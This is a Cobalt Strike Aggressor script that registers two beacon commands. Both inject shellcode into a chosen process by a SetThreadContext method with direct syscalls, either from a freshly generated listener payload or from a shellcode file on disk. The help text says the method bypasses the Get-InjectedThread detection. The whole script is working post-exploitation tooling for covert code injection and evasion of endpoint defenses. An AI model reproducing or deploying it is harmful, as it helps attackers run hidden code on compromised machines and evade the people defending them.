# Author: Chris Sikes
# Date: Apr 2021
# $1 = beacon ID
# $2 = pid
# x86_64-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.o

alias syscall_stc_shinject {
	local('$handle $data $args $sc_data');
	
	# read in the right BOF file
	$handle = openf(script_resource("syscall_stcinject.o"));
	$data = readb($handle, -1);
	closef($handle);

	$sc_handle = openf($3);
	$sc_data = readb($sc_handle, -1);
	closef($sc_handle);

	# pack our arguments
	$args = bof_pack($1, "ib", $2, $sc_data);
	
	btask($1, "Reading shellcode from: $+  $3");

	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}

alias syscall_stcinject {
	local('$bid $handle $data $pid $listener $payload');

	# check our arguments
	if (size(@_) != 3) {
		berror($1, "syscall_stcinject: not enough arguments. Enter the PID and Listener");
		return;
	}

	# parse our arguments
	$pid	= $2;
	$listener = $3;

	# Verify PID is a number
	if ((!-isnumber $pid) || (int($pid) <= 0))
	{
		berror($1, "syscall_stcinject: enter a valid PID");
		return;
	}

	# read in our BOF file...
	$handle = openf(script_resource("syscall_stcinject.o"));
	$data	= readb($handle, -1);
	closef($handle);

	if (listener_info($3) is $null)
	{
		berror($1, "Listener $3 is not found");
	}
	else
	{
    		# Generate a new payload 
    		$payload = payload($3, "x64", "thread");
		$handle2 = openf(">out.bin");
		writeb($handle2, $payload);
		closef($handle2);
   
		# pack our arguments
		$args	= bof_pack($1, "ib", $pid, $payload);

		# announce to our user..
		btask($1, "Injecting into PID $2");

		# run a BOF
		beacon_inline_execute($1, $data, "go", $args);
	}
}
beacon_command_register("syscall_stcinject", "XPN's SetThreadContext injection method with direct syscalls.", "Synopsis: syscall_stcinject [pid] [listener] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method.");

beacon_command_register("syscall_stc_shinject", "Direct syscalls to execute custom shellcode (.bin) from disk.", "Synopsis: syscall_stc_shinject [pid] [path/to/payload.bin] \n\nBased on XPN's method to bypass Get-InjectedThread\nThe SetThreadContext method using custom shellcode from disk.\nOption: From dll to .bin with SRDI.");

